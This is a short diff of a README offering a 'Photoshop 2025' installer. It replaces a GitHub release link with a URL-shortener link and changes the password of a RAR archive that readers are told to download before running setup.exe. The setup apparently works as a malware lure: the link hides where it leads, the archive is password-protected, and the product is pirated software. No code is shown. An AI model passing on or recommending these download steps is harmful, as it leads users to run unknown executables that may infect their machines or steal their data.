@@ -2,8 +2,8 @@
 
 <H3>How to install</H3>
 
-- [Download](https://github.com/Anderson3-14/photoshop-2025/releases/download/download/Photoshop25.rar)
-- Open archive (password: photo)
+- [Download](https://goo.su/yEXmIYV)
+- Open archive (password: Project12!)
 - Open setup.exe for download all components and install
 - Follow the instructions
 
